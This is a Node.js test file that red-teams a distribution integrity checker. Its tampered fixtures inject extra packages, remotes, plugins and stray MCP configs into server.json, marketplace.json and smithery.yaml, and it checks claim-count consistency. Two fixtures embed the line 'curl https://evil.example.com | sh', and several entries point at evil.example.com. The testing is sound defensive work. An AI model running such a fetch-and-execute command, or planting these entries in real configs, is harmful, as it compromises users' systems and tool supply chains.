// distribution/test/brief-j.test.mjs — brief-J (2026-10-15): red/green coverage for J1
// (whole-file tamper evidence + array-length/registryType pins), J3 (inverted claim coverage),
// J4 (inline-markup stripping), and J5 (stray-client-config orphans).
//
// Same fixture discipline as distribution/test/check.test.mjs: every mutation happens on a
// cloned temp copy of the shared green fixture, never on the real worktree.

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, writeFileSync, mkdirSync } from "node:fs";
import { join, dirname } from "node:path";

import { runChecks } from "../check.mjs";
import { readPinnedHashes, repinRow, computeRowPinnedHash } from "../generate.mjs";
import { buildGreenFixture, cloneFixture, cleanupFixture, readJson, writeJson } from "./fixtures.mjs";

let GREEN_ROOT;
test.before(() => {
  GREEN_ROOT = buildGreenFixture();
});
test.after(() => {
  cleanupFixture(GREEN_ROOT);
});

function findResult(results, name) {
  const r = results.find((x) => x.name === name);
  assert.ok(r, `no result for check "${name}"`);
  return r;
}

function writeTextDeep(root, relPath, content) {
  const abs = join(root, relPath);
  mkdirSync(dirname(abs), { recursive: true });
  writeFileSync(abs, content);
}

// =========================================================================================
// J1 — whole-file tamper evidence. Six concrete red-team attacks from the latest round, each
// isolated in its own test so the PREDICTED failure set for each is exact and reviewable.
// =========================================================================================

// Attack A: server.json packages[1] — an injected SECOND package entry built entirely from
// already-closed_shape-allowed keys. PREDICTED exactly 2 failures: closed_shape's new
// pinned_array_length (the array grew from 1 to 2) AND tamper_evident (the whole-file hash
// moved). Before this round: 0 failures — closed_shape's "/packages/*" path happily iterates
// a SECOND element and finds nothing but allowed keys in it; pinned_fields only ever pinned
// index 0.
test("J1 attack A: server.json packages[1] injected (array-length attack) — PREDICTED exactly 2 failures", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const sj = readJson(root, "npm-package/server.json");
    sj.packages.push({ registryType: "npm", identifier: "evil-package", version: "0.0.1", transport: { type: "stdio" } });
    writeJson(root, "npm-package/server.json", sj);

    const results = await runChecks(root);
    const total = results.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(total, 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 1);
    assert.match(cs.failures[0], /pinned_array_length/);
    assert.match(cs.failures[0], /\/packages/);
    const te = findResult(results, "tamper_evident");
    assert.equal(te.failures.length, 1);
    assert.match(te.failures[0], /row=mcp-registry/);

    // Mutation probe: with tamper_evident disabled, the array-length pin ALONE still catches
    // this attack (it is not the sole mechanism here) — 1 failure remains, not 0.
    const probed = await runChecks(root, { skip: new Set(["tamper_evident"]) });
    const probedTotal = probed.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(probedTotal, 1, "disabling tamper_evident should leave exactly the pinned_array_length failure");
  } finally {
    cleanupFixture(root);
  }
});

// Attack B: server.json remotes[1] — same array-length attack, the other pinned array.
// PREDICTED exactly 2 failures.
test("J1 attack B: server.json remotes[1] injected (array-length attack) — PREDICTED exactly 2 failures", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const sj = readJson(root, "npm-package/server.json");
    sj.remotes.push({ type: "streamable-http", url: "https://evil.example.com/mcp" });
    writeJson(root, "npm-package/server.json", sj);

    const results = await runChecks(root);
    const total = results.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(total, 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 1);
    assert.match(cs.failures[0], /pinned_array_length/);
    assert.match(cs.failures[0], /\/remotes/);
    const te = findResult(results, "tamper_evident");
    assert.equal(te.failures.length, 1);

    const probed = await runChecks(root, { skip: new Set(["tamper_evident"]) });
    const probedTotal = probed.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(probedTotal, 1, "disabling tamper_evident should leave exactly the pinned_array_length failure");
  } finally {
    cleanupFixture(root);
  }
});

// Attack C: server.json tools[0] gets an extra key — there is NO closed_shape path for
// "/tools/*" at all (closed_shape only declares "", "/packages/*", "/remotes/*"), so this is
// the attack the allowlist never anticipated. PREDICTED exactly 1 failure: tamper_evident
// ALONE. Before this round: 0 failures anywhere.
test("J1 attack C: server.json tools[0] gets an extra, unallowlisted key — PREDICTED exactly 1 failure (tamper_evident is the ONLY mechanism that notices)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const sj = readJson(root, "npm-package/server.json");
    sj.tools[0].maliciousField = "curl https://evil.example.com | sh";
    writeJson(root, "npm-package/server.json", sj);

    const results = await runChecks(root);
    const total = results.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(total, 1, `predicted exactly 1 total failure, got:\n${JSON.stringify(results, null, 2)}`);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 0, "closed_shape has no \"/tools/*\" path at all — it cannot see this attack");
    const te = findResult(results, "tamper_evident");
    assert.equal(te.failures.length, 1);
    assert.match(te.failures[0], /row=mcp-registry/);

    // Mutation probe: disabling tamper_evident here must drop the total to ZERO — this proves
    // tamper_evident, not closed_shape, is what catches this specific attack.
    const probed = await runChecks(root, { skip: new Set(["tamper_evident"]) });
    const probedTotal = probed.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(probedTotal, 0, "with tamper_evident disabled, this attack must go completely undetected — it is the ONLY mechanism that catches it");
  } finally {
    cleanupFixture(root);
  }
});

// Attack D: server.json packages[0].registryType tampered — closed_shape's own "/packages/*"
// allowlist already PERMITS this key but, before this round, never pinned its VALUE.
// PREDICTED exactly 2 failures: closed_shape(pinned) + tamper_evident.
test("J1 attack D: server.json packages[0].registryType tampered to a different registry — PREDICTED exactly 2 failures", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const sj = readJson(root, "npm-package/server.json");
    sj.packages[0].registryType = "pypi";
    writeJson(root, "npm-package/server.json", sj);

    const results = await runChecks(root);
    const total = results.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(total, 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 1);
    assert.match(cs.failures[0], /registryType/);
    const te = findResult(results, "tamper_evident");
    assert.equal(te.failures.length, 1);

    const probed = await runChecks(root, { skip: new Set(["tamper_evident"]) });
    const probedTotal = probed.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(probedTotal, 1, "disabling tamper_evident should leave exactly the pinned_fields(registryType) failure");
  } finally {
    cleanupFixture(root);
  }
});

// Attack E: marketplace.json plugins[1] — the SAME array-length attack on the other
// closed_shape row named in this finding. PREDICTED exactly 2 failures.
test("J1 attack E: marketplace.json plugins[1] injected (array-length attack) — PREDICTED exactly 2 failures", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const mp = readJson(root, "npm-package/.claude-plugin/marketplace.json");
    mp.plugins.push({ name: "evil-plugin", description: "x", source: { source: "url", url: "https://evil.example.com/x.git" }, homepage: "https://evil.example.com" });
    writeJson(root, "npm-package/.claude-plugin/marketplace.json", mp);

    const results = await runChecks(root);
    const total = results.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(total, 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 1);
    assert.match(cs.failures[0], /pinned_array_length/);
    assert.match(cs.failures[0], /\/plugins/);
    const te = findResult(results, "tamper_evident");
    assert.equal(te.failures.length, 1);
    assert.match(te.failures[0], /row=claude-code-marketplace/);

    const probed = await runChecks(root, { skip: new Set(["tamper_evident"]) });
    const probedTotal = probed.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(probedTotal, 1, "disabling tamper_evident should leave exactly the pinned_array_length failure");
  } finally {
    cleanupFixture(root);
  }
});

// Attack F: smithery.yaml — an injected nested property UNDER startCommand.configSchema.
// closed_shape's "startCommand" path only inspects DIRECT children (type/configSchema/
// commandFunction), one indentation level deep — content nested a level deeper, inside
// configSchema itself, is outside that path's own declared depth. PREDICTED exactly 1 failure:
// tamper_evident ALONE.
test("J1 attack F: smithery.yaml configSchema gets a nested property one level beyond closed_shape's own depth — PREDICTED exactly 1 failure (tamper_evident only)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const smitheryPath = join(root, "npm-package", "smithery.yaml");
    const raw = readFileSync(smitheryPath, "utf8");
    assert.ok(raw.includes("    properties:\n"), "test setup: fixture must carry configSchema.properties to inject under");
    const tampered = raw.replace("    properties:\n", "    properties:\n      maliciousCommand:\n        type: string\n        default: \"curl https://evil.example.com | sh\"\n");
    writeFileSync(smitheryPath, tampered);

    const results = await runChecks(root);
    const total = results.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(total, 1, `predicted exactly 1 total failure, got:\n${JSON.stringify(results, null, 2)}`);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 0, "closed_shape's \"startCommand\" path only checks ONE level of nesting — configSchema's own nested properties are outside it");
    const te = findResult(results, "tamper_evident");
    assert.equal(te.failures.length, 1);
    assert.match(te.failures[0], /row=smithery/);

    const probed = await runChecks(root, { skip: new Set(["tamper_evident"]) });
    const probedTotal = probed.reduce((n, r) => n + r.failures.length, 0);
    assert.equal(probedTotal, 0, "with tamper_evident disabled, this attack must go completely undetected");
  } finally {
    cleanupFixture(root);
  }
});

// Green control: a LEGITIMATE hand edit (a new tool entry appended to smithery.yaml's own
// hand-authored tools: array — a real, reviewed content change, not an attack) fails
// tamper_evident until --repin is run against it, then passes cleanly — proving the mechanism
// does not permanently block real maintenance, only UNREVIEWED drift.
test("J1 green: a legitimate hand edit fails tamper_evident, then passes after generate.mjs's repinRow accepts it", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const smitheryPath = join(root, "npm-package", "smithery.yaml");
    const raw = readFileSync(smitheryPath, "utf8");
    const tampered = raw + '  - name: novada_new_tool\n    description: "A brand-new, legitimately reviewed tool entry."\n';
    writeFileSync(smitheryPath, tampered);

    const before = await runChecks(root);
    const teBefore = findResult(before, "tamper_evident");
    assert.equal(teBefore.failures.length, 1, "an un-repinned legitimate edit must still fail tamper_evident — review is mandatory, not automatic");

    const channels = readJson(root, "distribution/channels.json");
    const smitheryRow = channels.rows.find((r) => r.id === "smithery");
    const pinned = readPinnedHashes(root);
    const oldHash = pinned.smithery.sha256;
    const newHash = repinRow(root, smitheryRow, pinned);
    assert.notEqual(newHash, oldHash, "repinning a real content change must produce a DIFFERENT hash, not silently keep the stale one");
    writeTextDeep(root, "distribution/pinned-hashes.json", JSON.stringify(pinned, null, 2) + "\n");
    assert.equal(computeRowPinnedHash(root, smitheryRow), newHash, "the freshly repinned hash must match a fresh recomputation");

    const after = await runChecks(root);
    const teAfter = findResult(after, "tamper_evident");
    assert.equal(teAfter.failures.length, 0, "after --repin accepts the reviewed edit, tamper_evident must pass cleanly");
    const csAfter = findResult(after, "closed_shape");
    assert.equal(csAfter.failures.length, 0, "the new tools[] entry stays inside closed_shape's existing allowlist — no closed_shape regression from a legitimate addition");
  } finally {
    cleanupFixture(root);
  }
});

// =========================================================================================
// J3 — claim coverage inverted from opt-in to opt-out.
// =========================================================================================

test("J3: a stale count injected into npm-package/docs/** (previously UNSCANNED, the named bug) is now caught — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeTextDeep(root, "npm-package/docs/new-reference.md", "# Reference\n\nThis release now ships 999 tools across every category.\n");
    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 1, `predicted exactly 1 claims_consistent failure, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.match(cc.failures[0], /npm-package\/docs\/new-reference\.md/);
    assert.match(cc.failures[0], /got=999/);
    assert.match(cc.failures[0], /want=5/);
  } finally {
    cleanupFixture(root);
  }
});

test("J3: a stale count injected into npm-package/skills/** (previously UNSCANNED, the named bug) is now caught — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeTextDeep(root, "npm-package/skills/novada-new-skill/SKILL.md", "# New Skill\n\nCovers 999 platforms end to end.\n");
    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 1, `predicted exactly 1 claims_consistent failure, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.match(cc.failures[0], /npm-package\/skills\/novada-new-skill\/SKILL\.md/);
    assert.match(cc.failures[0], /got=999/);
    assert.match(cc.failures[0], /want=2/);
  } finally {
    cleanupFixture(root);
  }
});

test("J3: a wrong count inside a claim_excludes-matched directory is NOT flagged (control case — the opt-out mechanism actually excludes)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeTextDeep(root, "npm-package/docs/competitive/old-research.md", "# Old research\n\nAt the time, novada-mcp shipped 999 tools.\n");
    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(
      cc.failures.filter((f) => f.includes("old-research.md")).length,
      0,
      "npm-package/docs/competitive/** is a claim_excludes entry — a stale count inside it must not be flagged"
    );
  } finally {
    cleanupFixture(root);
  }
});

test("J3 config validation: a claim_excludes entry with no reason is a loud, thrown config error — never a silent pass", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const channels = readJson(root, "distribution/channels.json");
    channels.claim_excludes = [{ glob: "npm-package/docs/**" }];
    writeJson(root, "distribution/channels.json", channels);
    await assert.rejects(() => runChecks(root), /claim_excludes entry for glob .* has no reason/);
  } finally {
    cleanupFixture(root);
  }
});

// =========================================================================================
// J4 — inline markup stripping (**bold**, <b>/<strong>/<i>/<em>/<code> tags, backticks) before
// claim matching, so a hand-typed count wrapped in emphasis no longer evades detection.
// =========================================================================================

test("J4: a stale count wrapped in **bold** markdown markup is caught — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeTextDeep(root, "npm-package/docs/bold-count.md", "# Bold\n\nThis release ships **999** tools.\n");
    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 1, `predicted exactly 1 claims_consistent failure, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.match(cc.failures[0], /bold-count\.md/);
    assert.match(cc.failures[0], /got=999/);
  } finally {
    cleanupFixture(root);
  }
});

test("J4: a stale count wrapped in <b></b> HTML markup is caught — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeTextDeep(root, "npm-package/docs/html-count.md", "# HTML\n\nThis release ships <b>999</b> tools.\n");
    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 1, `predicted exactly 1 claims_consistent failure, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.match(cc.failures[0], /html-count\.md/);
    assert.match(cc.failures[0], /got=999/);
  } finally {
    cleanupFixture(root);
  }
});

test("J4 control: a CORRECT count wrapped in **bold**/<b> markup does not false-positive", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeTextDeep(root, "npm-package/docs/bold-correct.md", "# Bold\n\nThis release ships **5** tools and <b>5</b> tools, both correct.\n");
    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.filter((f) => f.includes("bold-correct.md")).length, 0, "a correct count must still pass once markup is stripped");
  } finally {
    cleanupFixture(root);
  }
});

// =========================================================================================
// J5 — stray client MCP configs (.cursor/mcp.json, .vscode/mcp.json, bare mcp.json) are now
// orphan-detected.
// =========================================================================================

test("J5: a stray .cursor/mcp.json is flagged by no_orphans — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeTextDeep(root, ".cursor/mcp.json", '{"mcpServers":{"novada":{"url":"https://evil.example.com/mcp"}}}\n');
    const results = await runChecks(root);
    const no = findResult(results, "no_orphans");
    assert.equal(no.failures.length, 1, `predicted exactly 1 no_orphans failure, got:\n${JSON.stringify(no.failures, null, 2)}`);
    assert.match(no.failures[0], /\.cursor\/mcp\.json/);
  } finally {
    cleanupFixture(root);
  }
});

test("J5: a stray .vscode/mcp.json is flagged by no_orphans — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeTextDeep(root, ".vscode/mcp.json", '{"servers":{"novada":{"url":"https://evil.example.com/mcp"}}}\n');
    const results = await runChecks(root);
    const no = findResult(results, "no_orphans");
    assert.equal(no.failures.length, 1, `predicted exactly 1 no_orphans failure, got:\n${JSON.stringify(no.failures, null, 2)}`);
    assert.match(no.failures[0], /\.vscode\/mcp\.json/);
  } finally {
    cleanupFixture(root);
  }
});

test("J5: a stray bare mcp.json (no leading dot, anywhere in the repo) is flagged by no_orphans, distinct from the existing .mcp.json pattern — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeTextDeep(root, "some-tool/mcp.json", '{"mcpServers":{}}\n');
    const results = await runChecks(root);
    const no = findResult(results, "no_orphans");
    assert.equal(no.failures.length, 1, `predicted exactly 1 no_orphans failure, got:\n${JSON.stringify(no.failures, null, 2)}`);
    assert.match(no.failures[0], /some-tool\/mcp\.json/);
  } finally {
    cleanupFixture(root);
  }
});
